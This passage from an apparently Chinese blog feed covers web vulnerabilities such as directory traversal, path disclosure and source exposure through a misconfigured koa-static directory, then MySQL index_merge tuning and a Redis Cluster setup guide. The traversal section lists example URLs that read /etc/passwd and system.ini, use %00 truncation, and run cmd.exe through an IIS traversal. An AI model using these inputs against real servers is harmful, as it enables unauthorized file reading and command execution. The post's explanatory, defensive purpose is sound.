class="line">);</span><br></pre></td></tr></table></figure><p>嗯，大概就是这个意思，如果有更严格的权限控制，那在每个请求中凡是涉及到数据库的操作都需要先进行严格的验证，并且在设计数据库表的时候需要考虑进 userId 的账号关联以及权限关联。</p><h4 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h4><p>目录遍历漏洞指通过在 URL 或参数中构造 <strong>../</strong>，<strong>./</strong> 和类似的跨父目录字符串的 ASCII 编码、unicode 编码等，完成目录跳转，读取操作系统各个目录下的敏感文件，也可以称作「任意文件读取漏洞」。</p><p>目录遍历漏洞原理：程序没有充分过滤用户输入的 <strong>../</strong> 之类的目录跳转符，导致用户可以通过提交目录跳转来遍历服务器上的任意文件。使用多个 <strong>..</strong> 符号，不断向上跳转，最终停留在根 <strong>/</strong>，通过绝对路径去读取任意文件。</p><p>目录遍历漏洞几个示例和测试，一般构造 URL 然后使用浏览器直接访问，或者使用 Web 漏洞扫描工具检测，当然也可以自写程序测试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://somehost.com/../../../../../../../../../etc/passwd</span><br><span class="line">http://somehost.com/some/path?file=../../Windows/system.ini</span><br><span class="line"></span><br><span class="line"># 借助 %00 空字符截断是一个比较经典的攻击手法</span><br><span class="line">http://somehost.com/some/path?file=../../Windows/system.ini%00.js</span><br><span class="line"></span><br><span class="line"># 使用了 IIS 的脚本目录来移动目录并执行指令</span><br><span class="line">http://somehost.com/scripts/..%5c../Windows/System32/cmd.exe?/c+dir+c:\</span><br></pre></td></tr></table></figure><p><strong>防御</strong> 方法就是需要对 URL 或者参数进行 <strong>../</strong>，<strong>./</strong> 等字符的转义过滤</p><h4 id="物理路径泄漏"><a href="#物理路径泄漏" class="headerlink" title="物理路径泄漏"></a>物理路径泄漏</h4><p>物理路径泄露属于低风险等级缺陷，它的危害一般被描述为「攻击者可以利用此漏洞得到信息，来对系统进一步地攻击」，通常都是系统报错 500 的错误信息直接返回到页面可见导致的漏洞。得到物理路径有些时候它能给攻击者带来一些有用的信息，比如说：可以大致了解系统的文件目录结构；可以看出系统所使用的第三方软件；也说不定会得到一个合法的用户名（因为很多人把自己的用户名作为网站的目录名）。</p><p>防止这种泄漏的方法就是做好后端程序的出错处理，定制特殊的 500 报错页面。</p><h4 id="源码暴露漏洞"><a href="#源码暴露漏洞" class="headerlink" title="源码暴露漏洞"></a>源码暴露漏洞</h4><p>和物理路径泄露类似，就是攻击者可以通过请求直接获取到你站点的后端源代码，然后就可以对系统进一步研究攻击。那么导致源代码暴露的原因是什么呢？基本上就是发生在服务器配置上了，服务器可以设置哪些路径的文件才可以被直接访问的，这里给一个 koa 服务起的例子，正常的 koa 服务器可以通过 koa-static 中间件去指定静态资源的目录，好让静态资源可以通过路径的路由访问。比如你的系统源代码目录是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|- project</span><br><span class="line">    |- src</span><br><span class="line">    |- static</span><br><span class="line">    |- ...</span><br><span class="line">|- server.js</span><br></pre></td></tr></table></figure><p>你想要将 static 的文件夹配成静态资源目录，你应该会在 <strong>server.js</strong> 做如下配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const Koa = require(&apos;koa&apos;);</span><br><span class="line">const serve = require(&apos;koa-static&apos;);</span><br><span class="line">const app = new Koa();</span><br><span class="line"></span><br><span class="line">app.use(serve(__dirname + &apos;/project/static&apos;));</span><br></pre></td></tr></table></figure><p>但是如果配错了静态资源的目录，可能就出大事了，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// ...</span><br><span class="line">app.use(serve(__dirname + &apos;/project&apos;));</span><br></pre></td></tr></table></figure><p>这样所有的源代码都可以通过路由访问到了，所有的服务器都提供了静态资源机制，所以在通过服务器配置静态资源目录和路径的时候，一定要注意检验，不然很可能产生漏洞。</p><p>最后，希望 Web 开发者们能够管理好自己的代码隐私，注意代码安全问题，比如不要将产品的含有敏感信息的代码放到第三方外部站点或者暴露给外部用户，尤其是前端代码，私钥类似的保密性的东西不要直接输出在代码里或者页面中。也许还有很多值得注意的点，但是归根结底还是绷住安全那根弦，对待每一行代码都要多多推敲。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL优化之index_merge</title>
      <link href="/2019/04/15/2019-04-15-MySQL%E4%BC%98%E5%8C%96%E4%B9%8Bindex_merge/"/>
      <url>/2019/04/15/2019-04-15-MySQL%E4%BC%98%E5%8C%96%E4%B9%8Bindex_merge/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 查询器的查询负优化？ <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="慢查询"><a href="#慢查询" class="headerlink" title="慢查询"></a>慢查询</h3><p>最近在完成一个项目的三期工作，很是艰辛。<br>前两期历史遗留了许多慢查询，但由于过于久远，团队一直没有合适的时间去再回顾一遍业务逻辑，趁着这次三期工作，也想着顺便干掉之前的慢查询。</p><p>主要是针对下表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `demo` (</span><br><span class="line">  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `site_id` int(11) unsigned NOT NULL DEFAULT &apos;1&apos; COMMENT &apos;站点ID&apos;,</span><br><span class="line">  `survey_id` int(11) unsigned NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;问卷id&apos;,</span><br><span class="line">  `date` int(11) unsigned NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;日期 (例如: 20160906)&apos;,</span><br><span class="line">  `org_id` varchar(20) NOT NULL DEFAULT &apos;&apos; COMMENT &apos;门店id&apos;,</span><br><span class="line">  `choice` int(11) unsigned NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;选项id&apos;,</span><br><span class="line">  `num` int(11) unsigned NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;选择数量&apos;,</span><br><span class="line">  `send_num` int(11) unsigned NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;问卷发送量&apos;,</span><br><span class="line">  `reply_num` int(11) unsigned NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;问卷回复量&apos;,</span><br><span class="line">  `created_at` int(11) unsigned NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;创建时间&apos;,</span><br><span class="line">  `updated_at` int(11) unsigned NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;更新时间&apos;,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  KEY `idx_survey_id` (`survey_id`),</span><br><span class="line">  KEY `idx_org_id` (`org_id`),</span><br><span class="line">  KEY `idx_date_id_org` (`date`,`survey_id`,`org_id`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=2273822 DEFAULT CHARSET=utf8 COMMENT=&apos;问卷选项分布&apos;</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>有这么一句sql（涉及敏感数据均用’×‘代替）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">SELECT `id`, `org_id`, `date`, `survey_id`, `send_num`, `reply_num`, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __A0, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __B0, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __C0, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __D0, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __E0, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __A1, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __B1, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __C1, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __D1, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __E1, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __A2, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __B2, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __C2, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __D2, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __E2, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __A3, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __B3, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __C3, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __D3, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __E3, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __A4, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __B4, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __C4, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __D4, </span><br><span class="line">SUM(case when choice=&apos;×&apos; then num else 0 end) as __E4 </span><br><span class="line">FROM `demo` </span><br><span class="line">WHERE `date` BETWEEN 20190312 AND 20190412 AND `survey_id` = &apos;×&apos; AND `org_id`=&apos;×&apos; AND `site_id`=&apos;×&apos;</span><br><span class="line">GROUP BY `date`, `survey_id`, `org_id` ORDER BY `date` DESC LIMIT 10;</span><br></pre></td></tr></table></figure><p>其执行时间足足有829ms，当org_id是in操作的时候，可以达到2000ms+。</p><p>肯定有人第一直觉，觉得是SUM函数计算过多，导致慢查询。首先，这里并不会介绍其中的业务逻辑，但是这么多SUM运算都是有意义的；其次，这并不是导致慢查询的原因，把SUM全部去掉，执行时间还是有800ms+。</p><p>一眼看不出优化策略的，我们可以试着explain一下它：</p><img src="/2019/04/15/2019-04-15-MySQL优化之index_merge/pic1.png"><p>根据索引最左匹配原则，为什么没有命中idx_date_survey_org这个联合索引呢？在sql的实际执行过程，MySQL查询优化器会根据实际的情况选择索引，之所以在这里不命中idx_date_survey_org是因为date检索的时间跨度比较大，检索数据多，不如查询优化器选择的索引。</p><p>那么查询优化器选择的索引又是什么呢？可以看到在这一条sql的执行过程中竟然用到了两个索引，并且进行了一个叫index_merge的东西。</p><h3 id="index-merge"><a href="#index-merge" class="headerlink" title="index_merge"></a>index_merge</h3><p>什么是index_merge？查阅资料说明如下：</p><blockquote><p>MySQL5.0之前，一个表一次只能使用一个索引，无法同时使用多个索引分别进行条件扫描。但是从5.1开始，引入了 index merge 优化技术，对同一个表可以使用多个索引分别进行条件扫描。</p></blockquote><p>原来是这样，所以说这是MySQL针对查询的优化才对…吗？</p><p>这里不得不介绍一下survey_id这一列的特殊性：这个字段总共有三个值，分别对应每一期。也就是说合适的时间跨度下，survey_id的值是一样的。而全表200w+的数据，如果要对此索引进行检索，真的有必要吗？</p><p>稍微了解过索引优化的就会知道，这当然是没有必要的。不仅没有必要，这还会拖慢整个sql的查询。因为index_merge必须等待survey_id检索完，再进行intersect（此sql用到的合并算法）。</p><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><p>如此一来，优化策略就很简单粗暴了，有以下三种：</p><ul><li>强制使用其一索引</li><li>直接干掉where中的survey_id</li><li>联系dba干掉index_merge</li></ul><p>最后一种过于粗暴，不建议使用（因为这可能会被dba干掉）</p><h4 id="强制索引"><a href="#强制索引" class="headerlink" title="强制索引"></a>强制索引</h4><p>优化后的语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT `id`, `org_id`, `date`, `survey_id`, `send_num`, `reply_num`, </span><br><span class="line">...</span><br><span class="line">FROM `demo` FORCE index (idx_org_id)</span><br><span class="line">WHERE `date` BETWEEN 20190312 AND 20190412 AND `survey_id` = &apos;×&apos; AND `org_id`=&apos;×&apos; AND `site_id`=&apos;×&apos;</span><br><span class="line">GROUP BY `date`, `survey_id`, `org_id` ORDER BY `date` DESC LIMIT 10;</span><br></pre></td></tr></table></figure><p>执行耗时20ms，explain结果：</p><img src="/2019/04/15/2019-04-15-MySQL优化之index_merge/pic2.png"><h4 id="去掉对应检索项"><a href="#去掉对应检索项" class="headerlink" title="去掉对应检索项"></a>去掉对应检索项</h4><p>由于业务方面的考虑，没有对前几期survey_id检索的必要，顾项目中使用了这种方案。</p><p>优化后的语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT `id`, `org_id`, `date`, `survey_id`, `send_num`, `reply_num`, </span><br><span class="line">...</span><br><span class="line">FROM `demo`</span><br><span class="line">WHERE `date` BETWEEN 20190312 AND 20190412 AND `org_id`=&apos;×&apos; AND `site_id`=&apos;×&apos;</span><br><span class="line">GROUP BY `date`, `survey_id`, `org_id` ORDER BY `date` DESC LIMIT 10;</span><br></pre></td></tr></table></figure><p>执行耗时38ms，explain结果：</p><img src="/2019/04/15/2019-04-15-MySQL优化之index_merge/pic3.png">]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 数据库优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入学习Redis之集群</title>
      <link href="/2019/04/08/2019-04-08-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0Redis%E4%B9%8B%E9%9B%86%E7%BE%A4/"/>
      <url>/2019/04/08/2019-04-08-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0Redis%E4%B9%8B%E9%9B%86%E7%BE%A4/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> Redis的分布式存储方案 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="集群的作用"><a href="#集群的作用" class="headerlink" title="集群的作用"></a>集群的作用</h3><p>集群，即Redis Cluster，是Redis 3.0开始引入的分布式存储方案。</p><p>集群由多个节点(Node)组成，Redis的数据分布在这些节点中。集群中的节点分为主节点和从节点：只有主节点负责读写请求和集群信息的维护；从节点只进行主节点数据和状态信息的复制。</p><p>集群的作用，可以归纳为两点：</p><p><strong>（1）数据分区：数据分区(或称数据分片)是集群最核心的功能。</strong></p><p>集群将数据分散到多个节点，一方面突破了Redis单机内存大小的限制，存储容量大大增加；另一方面每个主节点都可以对外提供读服务和写服务，大大提高了集群的响应能力。</p><p>Redis单机内存大小受限问题，在介绍持久化和主从复制时都有提及；例如，如果单机内存太大，bgsave和bgrewriteaof的fork操作可能导致主进程阻塞，主从环境下主机切换时可能导致从节点长时间无法提供服务，全量复制阶段主节点的复制缓冲区可能溢出……。</p><p><strong>（2）高可用：集群支持主从复制和主节点的自动故障转移（与哨兵类似）；当任一节点发生故障时，集群仍然可以对外提供服务。</strong></p><h3 id="集群的搭建"><a href="#集群的搭建" class="headerlink" title="集群的搭建"></a>集群的搭建</h3><p>这一部分我们将搭建一个简单的集群：共6个节点，3主3从。方便起见：所有节点在同一台服务器上，以端口号进行区分；配置从简。3个主节点端口号：7000/7001/7002，对应的从节点端口号：8000/8001/8002。</p><p>集群的搭建有两种方式：</p><ul><li>手动执行Redis命令，一步步完成搭建；</li><li>使用Ruby脚本搭建。</li></ul><p>二者搭建的原理是一样的，只是Ruby脚本将Redis命令进行了打包封装；在实际应用中推荐使用脚本方式，简单快捷不容易出错。</p><h4 id="执行Redis命令搭建集群"><a href="#执行Redis命令搭建集群" class="headerlink" title="执行Redis命令搭建集群"></a>执行Redis命令搭建集群</h4><p>集群的搭建可以分为四步：</p><ul><li>启动节点：将节点以集群模式启动，此时节点是独立的，并没有建立联系；</li><li>节点握手：让独立的节点连成一个网络；</li><li>分配槽：将16384个槽分配给主节点；</li><li>指定主从关系：为从节点指定主节点。</li></ul><p>实际上，前三步完成后集群便可以对外提供服务；但指定从节点后，集群才能够提供真正高可用的服务。</p><h5 id="启动节点"><a href="#启动节点" class="headerlink" title="启动节点"></a>启动节点</h5><p>集群节点的启动仍然是使用redis-server命令，但需要使用集群模式启动。下面是7000节点的配置文件（只列出了节点正常工作关键配置，其他配置（如开启AOF）可以参照单机节点进行）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#redis-7000.conf</span><br><span class="line">port 7000</span><br><span class="line">cluster-enabled yes</span><br><span class="line">cluster-config-file &quot;node-7000.conf&quot;</span><br><span class="line">logfile &quot;log-7000.log&quot;</span><br><span class="line">dbfilename &quot;dump-7000.rdb&quot;</span><br><span class="line">daemonize yes</span><br></pre></td></tr></table></figure><p>其中的cluster-enabled和cluster-config-file是与集群相关的配置。</p><p><strong>cluster-enabled yes</strong>：Redis实例可以分为单机模式(standalone)和集群模式(cluster)；cluster-enabled yes可以启动集群模式。在单机模式下启动的Redis实例，如果执行info server命令，可以发现redis_mode一项为standalone，如下图所示：</p><img src="/2019/04/08/2019-04-08-深入学习Redis之集群/pic1.png"><p>集群模式下的节点，其redis_mode为cluster，如下图所示：</p><img src="/2019/04/08/2019-04-08-深入学习Redis之集群/pic2.png"><p><strong>cluster-config-file</strong>：该参数指定了<strong>集群配置文件</strong>的位置。每个节点在运行过程中，会维护一份集群配置文件；每当集群信息发生变化时（如增减节点），集群内所有节点会将最新信息更新到该配置文件；当节点重启后，会重新读取该配置文件，获取集群信息，可以方便的重新加入到集群中。<strong>也就是说，当Redis节点以集群模式启动时，会首先寻找是否有集群配置文件，如果有则使用文件中的配置启动，如果没有，则初始化配置并将配置保存到文件中。集群配置文件由Redis节点维护，不需要人工修改。</strong></p><p>编辑好配置文件后，使用redis-server命令启动该节点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server redis-7000.conf</span><br></pre></td></tr></table></figure><p>节点启动以后，通过cluster nodes命令可以查看节点的情况，如下图所示。</p><img src="/2019/04/08/2019-04-08-深入学习Redis之集群/pic3.png"><p>其中返回值第一项表示节点id，由40个16进制字符串组成，节点id与 主从复制 一文中提到的runId不同：Redis每次启动runId都会重新创建，但是节点id只在集群初始化时创建一次，然后保存到集群配置文件中，以后节点重新启动时会直接在集群配置文件中读取。</p><p>其他节点使用相同办法启动，不再赘述。需要特别注意，在启动节点阶段，节点是没有主从关系的，因此从节点不需要加slaveof配置。</p><h5 id="节点握手"><a href="#节点握手" class="headerlink" title="节点握手"></a>节点握手</h5><p>节点启动以后是相互独立的，并不知道其他节点存在；需要进行节点握手，将独立的节点组成一个网络。</p><p>节点握手使用cluster meet {ip} {port}命令实现，例如在7000节点中执行cluster meet 192.168.72.128 7001，可以完成7000节点和7001节点的握手；注意ip使用的是局域网ip而不是localhost或127.0.0.1，是为了其他机器上的节点或客户端也可以访问。此时再使用cluster nodes查看：</p><img src="/2019/04/08/2019-04-08-深入学习Redis之集群/pic4.png"><p>在7001节点下也可以类似查看：</p><img src="/2019/04/08/2019-04-08-深入学习Redis之集群/pic5.png"><p>同理，在7000节点中使用cluster meet命令，可以将所有节点加入到集群，完成节点握手：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cluster meet 192.168.72.128 7002</span><br><span class="line">cluster meet 192.168.72.128 8000</span><br><span class="line">cluster meet 192.168.72.128 8001</span><br><span class="line">cluster meet 192.168.72.128 8002</span><br></pre></td></tr></table></figure><p>执行完上述命令后，可以看到7000节点已经感知到了所有其他节点：</p><img src="/2019/04/08/2019-04-08-深入学习Redis之集群/pic6.png"><p>通过节点之间的通信，每个节点都可以感知到所有其他节点，以8000节点为例：</p><img src="/2019/04/08/2019-04-08-深入学习Redis之集群/pic7.png"><h5 id="分配槽"><a href="#分配槽" class="headerlink" title="分配槽"></a>分配槽</h5><p>在Redis集群中，借助槽实现数据分区，具体原理后文会介绍。<strong>集群有16384个槽，槽是数据管理和迁移的基本单位。当数据库中的16384个槽都分配了节点时，集群处于上线状态（ok）；如果有任意一个槽没有分配节点，则集群处于下线状态（fail）。</strong></p><p>cluster info命令可以查看集群状态，分配槽之前状态为fail：</p><img src="/2019/04/08/2019-04-08-深入学习Redis之集群/pic8.png"><p>分配槽使用cluster addslots命令，执行下面的命令将槽（编号0-16383）全部分配完毕：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -p 7000 cluster addslots &#123;0..5461&#125;</span><br><span class="line">redis-cli -p 7001 cluster addslots &#123;5462..10922&#125;</span><br><span class="line">redis-cli -p 7002 cluster addslots &#123;10923..16383&#125;</span><br></pre></td></tr></table></figure><p>此时查看集群状态，显示所有槽分配完毕，集群进入上线状态：</p><img src="/2019/04/08/2019-04-08-深入学习Redis之集群/pic9.png"><h5 id="指定主从关系"><a href="#指定主从关系" class="headerlink" title="指定主从关系"></a>指定主从关系</h5><p>集群中指定主从关系不再使用slaveof命令，而是使用cluster replicate命令；参数使用节点id。</p><p>通过cluster nodes获得几个主节点的节点id后，执行下面的命令为每个从节点指定主节点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -p 8000 cluster replicate be816eba968bc16c884b963d768c945e86ac51ae</span><br><span class="line">redis-cli -p 8001 cluster replicate 788b361563acb175ce8232569347812a12f1fdb4</span><br><span class="line">redis-cli -p 8002 cluster replicate a26f1624a3da3e5197dde267de683d61bb2dcbf1</span><br></pre></td></tr></table></figure><p>此时执行cluster nodes查看各个节点的状态，可以看到主从关系已经建立。</p><img src="/2019/04/08/2019-04-08-深入学习Redis之集群/pic10.png"><p>至此，集群搭建完毕。</p><h4 id="使用Ruby脚本搭建集群"><a href="#使用Ruby脚本搭建集群" class="headerlink" title="使用Ruby脚本搭建集群"></a>使用Ruby脚本搭建集群</h4><p>在{REDIS_HOME}/src目录下可以看到redis-trib.rb文件，这是一个Ruby脚本，可以实现自动化的集群搭建。</p><h5 id="安装Ruby环境"><a href="#安装Ruby环境" class="headerlink" title="安装Ruby环境"></a>安装Ruby环境</h5><p>以Ubuntu为例，如下操作即可安装Ruby环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ruby #安装ruby环境</span><br><span class="line">gem install redis #gem是ruby的包管理工具，该命令可以安装ruby-redis依赖</span><br></pre></td></tr></table></figure><h5 id="启动节点-1"><a href="#启动节点-1" class="headerlink" title="启动节点"></a>启动节点</h5><p>与第一种方法中的“启动节点”完全相同。</p><h5 id="搭建集群"><a href="#搭建集群" class="headerlink" title="搭建集群"></a>搭建集群</h5><p>redis-trib.rb脚本提供了众多命令，其中create用于搭建集群，使用方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-trib.rb create --replicas 1 192.168.72.128:7000 192.168.72.128:7001 192.168.72.128:7002 192.168.72.128:8000 192.168.72.128:8001 192.168.72.128:8002</span><br></pre></td></tr></table></figure><p>其中：–replicas=1表示每个主节点有1个从节点；后面的多个{ip:port}表示节点地址，前面的做主节点，后面的做从节点。使用redis-trib.rb搭建集群时，要求节点不能包含任何槽和数据。</p><p>执行创建命令后，脚本会给出创建集群的计划，如下图所示；计划包括哪些是主节点，哪些是从节点，以及如何分配槽。</p><p>输入yes确认执行计划，脚本便开始按照计划执行，如下图所示。</p><img src="/2019/04/08/2019-04-08-深入学习Redis之集群/pic12.png"><p>至此，集群搭建完毕。</p><h4 id="集群方案设计"><a href="#集群方案设计" class="headerlink" title="集群方案设计"></a>集群方案设计</h4><p>设计集群方案时，至少要考虑以下因素：</p><p>（1）高可用要求：根据故障转移的原理，至少需要3个主节点才能完成故障转移，且3个主节点不应在同一台物理机上；每个主节点至少需要1个从节点，且主从节点不应在一台物理机上；因此高可用集群至少包含6个节点。</p><p>（2）数据量和访问量：估算应用需要的数据量和总访问量(考虑业务发展，留有冗余)，结合每个主节点的容量和能承受的访问量(可以通过benchmark得到较准确估计)，计算需要的主节点数量。</p><p>（3）节点数量限制：Redis官方给出的节点数量限制为1000，主要是考虑节点间通信带来的消耗。在实际应用中应尽量避免大集群；如果节点数量不足以满足应用对Redis数据量和访问量的要求，可以考虑：(1)业务分割，大集群分为多个小集群；(2)减少不必要的数据；(3)调整数据过期策略等。</p><p>（4）适度冗余：Redis可以在不影响集群服务的情况下增加节点，因此节点数量适当冗余即可，不用太大。</p><h3 id="集群的基本原理"><a href="#集群的基本原理" class="headerlink" title="集群的基本原理"></a>集群的基本原理</h3><p>上一章介绍了集群的搭建方法和设计方案，下面将进一步深入，介绍集群的原理。<strong>集群最核心的功能是数据分区，因此首先介绍数据的分区规则；然后介绍集群实现的细节：通信机制和数据结构；最后以cluster meet(节点握手)、cluster addslots(槽分配)为例，说明节点是如何利用上述数据结构和通信机制实现集群命令的。</strong></p><h4 id="数据分区方案"><a href="#数据分区方案" class="headerlink" title="数据分区方案"></a>数据分区方案</h4><p>数据分区有顺序分区、哈希分区等，其中哈希分区由于其天然的随机性，使用广泛；集群的分区方案便是哈希分区的一种。</p><p>哈希分区的基本思路是：对数据的特征值（如key）进行哈希，然后根据哈希值决定数据落在哪个节点。常见的哈希分区包括：哈希取余分区、一致性哈希分区、带虚拟节点的一致性哈希分区等。</p><p>衡量数据分区方法好坏的标准有很多，其中比较重要的两个因素是(1)数据分布是否均匀(2)增加或删减节点对数据分布的影响。由于哈希的随机性，哈希分区基本可以保证数据分布均匀；因此在比较哈希分区方案时，重点要看增减节点对数据分布的影响。</p><p>（1）哈希取余分区</p><p>哈希取余分区思路非常简单：计算key的hash值，然后对节点数量进行取余，从而决定数据映射到哪个节点上。该方案最大的问题是，当新增或删减节点时，节点数量发生变化，系统中所有的数据都需要重新计算映射关系，引发大规模数据迁移。</p><p>（2）一致性哈希分区</p><p>一致性哈希算法将整个哈希值空间组织成一个虚拟的圆环，如下图所示，范围为0-2^32-1；对于每个数据，根据key计算hash值，确定数据在环上的位置，然后从此位置沿环顺时针行走，找到的第一台服务器就是其应该映射到的服务器。</p><img src="/2019/04/08/2019-04-08-深入学习Redis之集群/pic13.png"><p>与哈希取余分区相比，一致性哈希分区将增减节点的影响限制在相邻节点。以上图为例，如果在node1和node2之间增加node5，则只有node2中的一部分数据会迁移到node5；如果去掉node2，则原node2中的数据只会迁移到node4中，只有node4会受影响。</p><p>一致性哈希分区的主要问题在于，当节点数量较少时，增加或删减节点，对单个节点的影响可能很大，造成数据的严重不平衡。还是以上图为例，如果去掉node2，node4中的数据由总数据的1/4左右变为1/2左右，与其他节点相比负载过高。</p><p>（3）带虚拟节点的一致性哈希分区</p><p>该方案在一致性哈希分区的基础上，引入了虚拟节点的概念。<strong>Redis集群使用的便是该方案，其中的虚拟节点称为槽（slot）</strong>。槽是介于数据和实际节点之间的虚拟概念；每个实际节点包含一定数量的槽，每个槽包含哈希值在一定范围内的数据。引入槽以后，数据的映射关系由数据hash-&gt;实际节点，变成了数据hash-&gt;槽-&gt;实际节点。</p><p><strong>在使用了槽的一致性哈希分区中，槽是数据管理和迁移的基本单位。槽解耦了数据和实际节点之间的关系，增加或删除节点对系统的影响很小</strong>。仍以上图为例，系统中有4个实际节点，假设为其分配16个槽(0-15)； 